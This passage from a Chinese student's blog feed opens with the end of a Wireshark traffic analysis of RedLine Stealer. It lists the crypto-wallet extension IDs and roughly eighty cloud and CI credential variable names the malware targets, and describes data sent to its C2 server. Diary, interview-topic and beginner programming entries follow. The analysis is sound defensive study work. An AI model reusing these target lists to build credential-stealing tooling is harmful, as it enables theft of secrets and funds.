<li>aodkkagnadcbobfpggfnjeongemjbjca|BoltX</li>
<li>odbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet</li>
<li>aeachknmefphepccionboohckonoeemg|Coin98Wallet</li>
<li>hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase</li>
<li>blnieiiffboillknjnepogjhkgnoapac|EqualWallet</li>
<li>hpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet</li>
<li>nanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet</li>
<li>fnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet</li>
<li>kncchdigobghenbbaddojjnnaogfppfj|iWallet</li>
<li>cjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty</li>
<li>pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain</li>
<li>kpfopkelmapcoipemfendmdcghnegimn|LiqualityWallet</li>
<li>dngmlblcodfobpdpecaadgfbcggfjfnm|MaiarDeFiWallet</li>
<li>afbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet</li>
<li>nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask</li>
<li>nlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx</li>
<li>lpfcbjknijpeeillifnkikgncikgfhdo|NamiWallet</li>
<li>jbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet</li>
<li>fhilaheimglignddkjgofkcbgekhenbh|Oxygen</li>
<li>mgffkfbidihjpoaomajlbgchddlicgpn|PaliWallet</li>
<li>bfnaelmomeimhlpmgjnjophhpkkoljpa|Phantom</li>
<li>fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet</li>
<li>nkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet</li>
<li>aiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation</li>
<li>cgeeodpfagjceefieflmdfphplkenlfk|TonCrystal</li>
<li>ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink</li>
<li>amkmjjmmflddogmhpjloimipbofnfjih|Wombat</li>
<li>hmeobnfnfcmdkdcmlblgagmfpfboieaf|XdefiWallet</li>
<li>ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet</li>
</ul>
<p>滚动到流的末尾，我们发现此感染会搜索可能安装在主机上的其他程序的 API 密钥和登录数据</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712104750858.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712104750858"></p>
<p>此列表包括各种云平台、社交媒体应用程序和其他工具。下面是按字母顺序排序的列表。</p>
<ul>
<li>ALGOLIA_API_KEY</li>
<li>AMAZON_AWS_ACCESS_KEY_ID</li>
<li>AMAZON_AWS_SECRET_ACCESS_KEY</li>
<li>AWS_ACCESS_KEY_ID</li>
<li>AWS_SECRET_ACCESS_KEY</li>
<li>AZURE_CLIENT_ID</li>
<li>AZURE_CLIENT_SECRET</li>
<li>AZURE_PASSWORD</li>
<li>AZURE_USERNAME</li>
<li>binance_api</li>
<li>binance_secret</li>
<li>BITTREX_API_KEY</li>
<li>BITTREX_API_SECRET</li>
<li>CF_PASSWORD</li>
<li>CF_USERNAME</li>
<li>CI_DEPLOY_PASSWORD</li>
<li>CI_DEPLOY_PASSWORD</li>
<li>CI_DEPLOY_USER</li>
<li>CI_DEPLOY_USER</li>
<li>CI_JOB_JWT</li>
<li>CI_JOB_JWT_V2</li>
<li>CI_JOB_TOKEN</li>
<li>CIRCLE_TOKEN</li>
<li>CODECLIMATE_REPO_TOKEN</li>
<li>CONSUMER_KEY</li>
<li>CONSUMER_SECRET</li>
<li>COVERALLS_REPO_TOKEN</li>
<li>DIGITALOCEAN_ACCESS_TOKEN</li>
<li>DOCKER_EMAIL</li>
<li>DOCKER_PASSWORD</li>
<li>DOCKER_USERNAME</li>
<li>DOCKERHUB_PASSWORD</li>
<li>FACEBOOK_ACCESS_TOKEN</li>
<li>FACEBOOK_APP_ID</li>
<li>FACEBOOK_APP_SECRET</li>
<li>FIREBASE_TOKEN</li>
<li>FOSSA_API_KEY</li>
<li>GH_ENTERPRISE_TOKEN</li>
<li>GH_TOKEN</li>
<li>GITLAB_USER_LOGIN</li>
<li>GOOGLE_API_KEY</li>
<li>GOOGLE_APPLICATION_CREDENTIALS</li>
<li>HEROKU_API_KEY</li>
<li>HEROKU_API_USER</li>
<li>MAILGUN_API_KEY</li>
<li>MCLI_PRIVATE_API_KEY</li>
<li>MCLI_PUBLIC_API_KEY</li>
<li>MSI_ENDPOINT</li>
<li>MSI_SECRET</li>
<li>NGROK_AUTH_TOKEN</li>
<li>NGROK_TOKEN</li>
<li>NPM_AUTH_TOKEN</li>
<li>OKTA_AUTHN_GROUPID</li>
<li>OKTA_CLIENT_ORGURL</li>
<li>OKTA_CLIENT_TOKEN</li>
<li>OKTA_OAUTH2_CLIENTID</li>
<li>OKTA_OAUTH2_CLIENTSECRET</li>
<li>OS_PASSWORD</li>
<li>OS_USERNAME</li>
<li>PERCY_TOKEN</li>
<li>SAUCE_ACCESS_KEY</li>
<li>SAUCE_USERNAME</li>
<li>SENTRY_AUTH_TOKEN</li>
<li>SLACK_TOKEN</li>
<li>square_access_token</li>
<li>square_oauth_secret</li>
<li>STRIPE_API_KEY</li>
<li>STRIPE_DEVICE_NAME</li>
<li>SURGE_LOGIN</li>
<li>SURGE_TOKEN</li>
<li>TOKEN</li>
<li>TRAVIS_OS_NAME</li>
<li>TRAVIS_SECURE_ENV_VARS</li>
<li>TRAVIS_SUDO</li>
<li>TWILIO_ACCOUNT_SID</li>
<li>VAULT_CLIENT_KEY</li>
<li>VAULT_TOKEN</li>
<li>VULTR_ACCESS</li>
<li>VULTR_SECRET</li>
</ul>
<p>接下来，切换 TCP 流窗口以查看从受感染主机发送到服务器的数据。这揭示了受感染受害者的 Windows 桌面的屏幕截图已发送到 C2 服务器的迹象</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712104854395.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712104854395"></p>
<p>转换成原始数据保存，使用十六进制编辑器删除 png 图像开始之前的内容</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712105403785.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712105403785"></p>
<p>拿到图片</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712105430195.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712105430195"></p>
<p>屏幕截图显示了一个 PowerShell 窗口，其中包含来自 Web 流量连接的数据。</p>
<p>查看映像后，返回 TCP 流 （tcp.stream eq 71），将其作为 ASCII 数据查看，然后选择仅从受感染的 Windows 主机到 C2 服务器的流量。滚动到末尾以查看发送到 C2 服务器的其他数据。</p>
<p>更多地了解受感染的 Windows 主机将有助于我们更好地了解这些数据。受感染的 Windows 主机是最小安装，它只有一组登录凭据存储在 Microsoft Edge 浏览器中。主机在用户的“文档”文件夹中只存储了一个 Word 文档。该文件被命名为 Top_secret_ducment.docx。</p>
<p>在这个 TCP 流的末尾，我们找到了正在运行的进程列表，如下图 17 所示。我们还可以从受感染的主机中找到硬件信息，从 Edge 浏览器找到登录凭据，以及名为 Top_secret_ducment.docx 的文件。</p>
<p><img src="/../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712154112040.png" alt="../images/Wireshark-sd/Crossing%20the%20Line%20Unit%2042%20Wireshark%20Quiz%20for%20RedLine%20Stealer/image-20240712154112040"></p>
<p>正在运行的进程、硬件信息、登录凭据和 Word 文档从受感染的 Windows 主机泄露。</p>
<p>运行进程列表还显示了 powershell.exe 运行 C：\Users\rwalters\Documents\mystery_file.ps1 文件的进程。该 .ps1 文件生成了此 Wireshark 测验的感染流量。</p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>记录我的2023年</title>
    <url>/posts/32e2a4f7.html</url>
    <content><![CDATA[<h1 id="简单记录自己的-2023-年"><a href="#简单记录自己的-2023-年" class="headerlink" title="简单记录自己的 2023 年"></a>简单记录自己的 2023 年</h1><blockquote>
<p>看到朋友圈都在晒，也一直想记录一下自己的 2023 年，想不到有什么好的方法，看到康哥用博客记录，我也跟风写一下吧。</p>
<p>非常庆幸自己有一本大厚日记本，不如真不知道怎么写这篇博文</p>
<p>截止目前日记本已经写完三个本子了，记忆里大概是从高一下学期开始写一直到现在（虽然最近一个月没写，大抵是没空了）</p>
<p><span style="color:#FF0000;"> 呼呼光这一篇就写了快一个小时 </span></p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E6%97%A5%E8%AE%B0%E6%9C%AC.jpg"
                      alt="日记本"
                ></p>
<h2 id="孟春之月（一月）"><a href="#孟春之月（一月）" class="headerlink" title="孟春之月（一月）"></a>孟春之月（一月）</h2><p>翻开日记发现竟然没有 1 月，那 1 月我到底干了些什么呢，打开相册回忆一下。</p>
<p>原因竟然是 <strong>疫情</strong>！1 月大概是大一上学期刚放寒假，那时候还在疫情时代，大家都阳了没什么好写的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E5%9B%9E%E5%AE%B6.jpg"
                      alt="日记本"
                ></p>
<h2 id="仲春之月（二月）"><a href="#仲春之月（二月）" class="headerlink" title="仲春之月（二月）"></a>仲春之月（二月）</h2><p>大一上初识 CTF，但是也没什么入门，一直处在门外边的水平</p>
<p>整个寒假算是我 CTF 学习阶段进步比较大的一段时间，用一个寒假来入了一下门，知道了什么是编码，什么是 IDA，什么是加壳脱壳……</p>
<p>放一波刷题记录</p>
<p>大概是从 2 月开始跑步减肥的（虽然只减了十几斤，而且现在已经吃回来了）</p>
<div style="display: flex; justify-content: center;">
    <figure style="margin-right: 20px;">
        <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="../images/my2023/编码.png"
                      alt="buu刷题记录" style="max-width: 100%;"
                >
        <figcaption> Caption for Image 1 </figcaption>
    </figure>
    <figure>
        <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="../images/my2023/ctfshow刷题.png"
                      alt="ctfshow刷题记录" style="max-width: 100%;"
                >
        <figcaption> Caption for Image 2 </figcaption>
    </figure>
</div>

<p>一入网安深似海，从此 hacker 不能改</p>
<p>从小一个黑客梦，还是想感叹 <span style="color:#FF0000;"> 高考能考到自己喜欢的专业是多么幸福的一件事 </span></p>
<h2 id="季春之月（三月）"><a href="#季春之月（三月）" class="headerlink" title="季春之月（三月）"></a>季春之月（三月）</h2><p>三月就已经开学上课了，一开始听课还能听点，结果是越来越不听了吧</p>
<p>三月的时候还挺爱打羽毛球的，现在怎么不打了</p>
<p>三月学院 <a class="link"   href="https://mp.weixin.qq.com/s/nuZqsShR668drH-b8POC-w" >班歌比赛<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，负责剪辑班歌视频，嘻嘻，荣获一等奖，当时还跟朋友们拍了一张合影（照片里面现在貌似只剩我没对象了 hhhhh）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E5%90%88%E5%BD%B1.jpg"
                      alt="合影"
                ></p>
<h2 id="孟夏之月（四月）"><a href="#孟夏之月（四月）" class="headerlink" title="孟夏之月（四月）"></a>孟夏之月（四月）</h2><p>四月发生的印象最深的事情就是烫了个发吧，当时还觉得蛮好看的</p>
<p>现在已经剪没了，也没再继续烫。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E7%83%AB%E5%8F%91.jpg"
                      alt="烫发"
                ></p>
<h2 id="仲夏之月（五月）"><a href="#仲夏之月（五月）" class="headerlink" title="仲夏之月（五月）"></a>仲夏之月（五月）</h2><p>四月五月是打扮自己最多的几个月（大概是受食人鱼的指点了吧 🤔 不过也确实学到点东西）</p>
<p>跟好鸽们打电话时候的正规军。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/gwl%E8%A7%86%E9%A2%91%E7%94%B5%E8%AF%9D.jpg"
                      alt="视频电话"
                ></p>
<p>在毕业晚会幕后道具工作</p>
<div style="display: flex; align-items: flex-start;">
    <div style="flex: 1; text-align: center;">
        <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="../images/my2023/毕业晚会门票.jpg"
                      alt="毕业晚会门票" style="width: 85%; vertical-align: top;"
                >
        <p style="text-align: center;"> 毕业晚会门票 </p>
    </div>
    <div style="flex: 1; text-align: center;">
        <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="../images/my2023/毕业晚会幕后.jpg"
                      alt="毕业晚会幕后" style="width: 100%; vertical-align: bottom;"
                >
        <p style="text-align: center;"> 毕业晚会幕后 </p>
    </div>
</div>

<p>5 月 20 号简历设计大赛二等奖 <span style="color:#FF0000;"> 证书 </span> 发下来了</p>
<p>5 月 30 号，二阳了</p>
<h2 id="季夏之月（六月）"><a href="#季夏之月（六月）" class="headerlink" title="季夏之月（六月）"></a>季夏之月（六月）</h2><p>这个月一开始看了历史文化学院的最美汉服代言人表演，太惊艳了，全是戏曲</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E6%B1%89%E6%9C%8D%E4%BB%A3%E8%A8%80%E4%BA%BA.jpg"
                      alt="最美汉服代言人"
                ></p>
<p>上课看完了深海哈哈哈哈，物理课不听课看电影，挺有教育意义的一部动画电影</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E6%B7%B1%E6%B5%B7.jpg"
                      alt="深海"
                ></p>
<p>填了积极分子相关资料</p>
<p>在百佳宿舍评选幕后，也是这时候认识了 myk 师哥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E7%99%BE%E4%BD%B3%E5%AE%BF%E8%88%8D.jpg"
                      alt="百佳宿舍"
                ></p>
<p>献血最光荣嘻嘻，我不在意最后这一袋血会拿去干什么，至于他是否被卖掉或者被浪费，我不关心，但行好事莫问前程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E7%8C%AE%E8%A1%80.jpg"
                      alt="献血"
                ></p>
<p>月末放暑假假回家咯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E6%9A%91%E5%81%87%E6%94%BE%E5%81%87.jpg"
                      alt="暑假极爱"
                ></p>
<p>讲真的，这次回家是为了考驾照，如果不是为了考驾照，我是真的想留校学习的，毕竟还有很多东西要学。</p>
<h2 id="孟秋之月（七月）"><a href="#孟秋之月（七月）" class="headerlink" title="孟秋之月（七月）"></a>孟秋之月（七月）</h2><p>考驾照的第一个月，下半身没做防晒，从脚踝开始上面是黑的下面是白的，已经是泾渭分明了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E8%85%BF%E5%AD%90.jpg"
                      alt="黑白分明"
                ></p>
<p>好在科一到科四都一把过，科二满分，驾照到手，也算没白费</p>
<h2 id="仲秋之月（八月）"><a href="#仲秋之月（八月）" class="headerlink" title="仲秋之月（八月）"></a>仲秋之月（八月）</h2><p>8 月多久已经快开学了，我实在是在家待不住了，提前返校学一会，不得不说，一个人是真的舒服</p>
<p>见证了日本核污水不负责任排放大海</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E6%9B%B2%E9%98%9C%E6%B1%BD%E8%BD%A6%E7%AB%99.jpg"
                     
                ></p>
<p>8 月 23 一次突发奇想，做了大学时代的第一个面向全校的公益项目（也不能说是项目）——<a class="link"   href="https://w1ndys.top/2023/09/01/QFNU_Course_Selection_Guide_North/#/" >曲阜师范大学选课指北<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，旨在帮助大家选择合适的任课老师</p>
<p>目前已经有 120+参与贡献者，浏览量 4w+</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E9%80%89%E8%AF%BE%E6%8C%87%E5%8C%97.png"
                      alt="image-20231231234930273"
                ></p>
<h2 id="季秋之月（九月）"><a href="#季秋之月（九月）" class="headerlink" title="季秋之月（九月）"></a>季秋之月（九月）</h2><p>九月迎新，大一新生开学了，也是又老了一年，接了两个师弟。</p>
<p>然后紧张激烈的纳新也开始了，出席了社团管理部的宣讲，网络空间安全协会的宣讲，还有有关于逆向等方面的知识（虽然我也很菜）</p>
<h2 id="孟冬之月（十月）"><a href="#孟冬之月（十月）" class="headerlink" title="孟冬之月（十月）"></a>孟冬之月（十月）</h2><p>十月一回来之后就长胖了，再也没减下去</p>
<p>认识了几个大一的师弟师妹，都挺好的，好学又调皮可爱</p>
<p>然后就是去山东警察学院打了省赛，跟着师哥去打了科来杯，人生第一次线下赛，总体体验还是学到很多东西的，特别是让我明白人外有人，自己永远是菜狗</p>
<p><a class="link"   href="https://w1ndys.top/2023/10/29/CTF_think_kelai_10/#/" >科来杯心得<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://w1ndys.top../images/%E7%A7%91%E6%9D%A5%E6%9D%AF10/%E5%B1%B1%E4%B8%9C%E8%AD%A6%E5%AF%9F%E5%AD%A6%E9%99%A2.jpg"
                      alt="山东警察学院大门"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E7%A7%91%E6%9D%A5%E6%9D%AF.jpg"
                      alt="科来杯"
                ></p>
<h2 id="仲冬之月（十一月）"><a href="#仲冬之月（十一月）" class="headerlink" title="仲冬之月（十一月）"></a>仲冬之月（十一月）</h2><p>十一月在迎新晚会幕后主持道具组</p>
<p><a class="link"   href="https://w1ndys.top/2023/11/30/CTF_think_jnxl2023/#/" >参加了技能兴鲁网络安全技能挑战赛<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81.jpg"
                      alt="技能兴鲁"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://w1ndys.top../images/jnxl2023/1701356901716.jpg"
                     
                ></p>
<p>好大儿送的一本刑法，旨在叫我好好遵守网络安全法，将来做一个白帽子不要误入歧途</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/my2023/%E5%A5%BD%E5%A4%A7%E5%84%BF.png"
                      alt="好大儿"
                ></p>
<h2 id="季冬之月（十二月）"><a href="#季冬之月（十二月）" class="headerlink" title="季冬之月（十二月）"></a>季冬之月（十二月）</h2><p>已经沦为卷比的形状了捏 😭😭😭😭😭😭</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>W1ndys年度总结</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>2024山东省网络安全技能大赛九州信泰杯wp</title>
    <url>/posts/36d0dbb.html</url>
    <content><![CDATA[<p>一直没空写，忙完再说吧</p>
]]></content>
  </entry>
  <entry>
    <title>2024年4月12日HW面试被拷打</title>
    <url>/posts/8aed0b1c.html</url>
    <content><![CDATA[<h1 id="2024-年-4-月-12-日-HW-面试被拷打"><a href="#2024-年-4-月-12-日-HW-面试被拷打" class="headerlink" title="2024 年 4 月 12 日 HW 面试被拷打"></a>2024 年 4 月 12 日 HW 面试被拷打</h1><p>下午开始面试</p>
<p>首先进腾讯会议，要开视频，首先就被点了，看简历说没什么和安全有关的。</p>
<h2 id="面试过程"><a href="#面试过程" class="headerlink" title="面试过程"></a>面试过程</h2><p>首先进腾讯会议，开摄像头</p>
<p>大约问了下面问题</p>
<ul>
<li>年龄</li>
<li>是大学生吗，有没有毕业</li>
<li>冰蝎的特征、默认密码</li>
<li>查找数据表的命令</li>
<li>提权</li>
<li>溯源</li>
<li>应急响应</li>
<li>如果 shell 没有回显怎么办</li>
<li>内存马</li>
<li>SQL 注入</li>
<li>SQLmap</li>
<li>什么是 CSRF 攻击</li>
<li>CSRF 漏洞和 SSRF 漏洞的区别</li>
<li>什么是 XSS 漏洞</li>
<li>什么是 XXE 漏洞</li>
<li>SSRF 漏洞</li>
<li>什么是 Webshell，被上传到服务器怎么办</li>
<li>Java 反序列化漏洞</li>
</ul>
<p>薪资，工作地点</p>
<p><strong>大概是寄了</strong></p>
]]></content>
      <categories>
        <category>HW</category>
      </categories>
      <tags>
        <tag>HW</tag>
      </tags>
  </entry>
  <entry>
    <title>2024年4月12日蓝桥刷题</title>
    <url>/posts/8664db3c.html</url>
    <content><![CDATA[<h1 id="2024-年-4-月-12-日蓝桥刷题"><a href="#2024-年-4-月-12-日蓝桥刷题" class="headerlink" title="2024 年 4 月 12 日蓝桥刷题"></a>2024 年 4 月 12 日蓝桥刷题</h1><p>最后一天了，突击一下</p>
<hr>
<h1 id="计算-2-的幂"><a href="#计算-2-的幂" class="headerlink" title="计算 2 的幂"></a>计算 2 的幂</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定非负整数 $n$，求 $2^n$ 的值。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>一个整数 $n$。$0\le n&lt;31$。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>一个整数，即 $2$ 的 $n$ 次方。</p>
<p>请注意，如果您正在使用 <code>cout</code> 进行输出，您需要关注被输出的数据的类型。输出格式不符合预期可能会造成答案错误。</p>
<p>常用函数的返回值类型可以在 <a class="link"   href="https://en.cppreference.com/w/" >cppreference.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 和 <a class="link"   href="https://cplusplus.com/" >cplusplus.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 查询到。例如，您可以在这两个网站中查到 <code>pow</code> 函数的返回值是 <code>float</code> 或 <code>double</code>。</p>
<p>您可以使用显式或隐式的类型转换，来变换数据类型。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">8</span><br></pre></td></tr></table></figure></div>

<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>\*\*n)</span><br></pre></td></tr></table></figure></div>

<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>没啥好说的，简单题自己安慰自己</p>
<h1 id="含-k-个-3-的数"><a href="#含-k-个-3-的数" class="headerlink" title="含 k 个 3 的数"></a>含 k 个 3 的数</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>输入两个正整数 $m$ 和 $k$，其中 $1 \lt m \leq 10^{15}$，$1 \lt k \leq 15$ ，判断 $m$ 是否恰好含有 $k$ 个 $3$，如果满足条件，则输出 <code>YES</code>，否则，输出 <code>NO</code>。</p>
<h2 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入一行，为两个整数 $m,k$，中间用单个空格间隔。</p>
<h2 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h2><p>满足条件，则输出 <code>YES</code>，否则，输出 <code>NO</code>。</p>
<h2 id="样例-1-1"><a href="#样例-1-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1-1"><a href="#样例输入-1-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">43833 3</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1-1"><a href="#样例输出-1-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">YES</span><br></pre></td></tr></table></figure></div>

<h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">m, k = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">m = <span class="built_in">str</span>(m)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    <span class="keyword">if</span> m[i] == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> count == k:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;YES&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NO&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h2><p>先将 $m$ 转换为字符串，然后遍历字符串，统计 $3$ 的个数，如果个数等于 $k$，则输出 <code>YES</code>，否则，输出 <code>NO</code>。</p>
<h1 id="NOIP2011-普及组-数字反转"><a href="#NOIP2011-普及组-数字反转" class="headerlink" title="[NOIP2011 普及组] 数字反转"></a>[NOIP2011 普及组] 数字反转</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个整数 $N$，请将该数各个位上数字反转得到一个新数。新数也应满足整数的常见形式，即除非给定的原数为零，否则反转后得到的新数的最高位数字不应为零（参见样例 2）。</p>
<h2 id="输入格式-2"><a href="#输入格式-2" class="headerlink" title="输入格式"></a>输入格式</h2><p>一个整数 $N$。</p>
<h2 id="输出格式-2"><a href="#输出格式-2" class="headerlink" title="输出格式"></a>输出格式</h2><p>一个整数，表示反转后的新数。</p>
<h2 id="样例-1-2"><a href="#样例-1-2" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1-2"><a href="#样例输入-1-2" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">123</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1-2"><a href="#样例输出-1-2" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">321</span><br></pre></td></tr></table></figure></div>

<h2 id="样例-2"><a href="#样例-2" class="headerlink" title="样例 #2"></a>样例 #2</h2><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入 #2"></a>样例输入 #2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-380</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出 #2"></a>样例输出 #2</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-83</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p><strong>【数据范围】</strong></p>
<p>$-1,000,000,000\leq N\leq 1,000,000,000 $。</p>
<p>noip2011 普及组第一题</p>
<h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">    n = -n</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">str</span>(n)[::-<span class="number">1</span>])</span><br><span class="line">    n = -n</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">str</span>(n)[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(n)</span><br></pre></td></tr></table></figure></div>

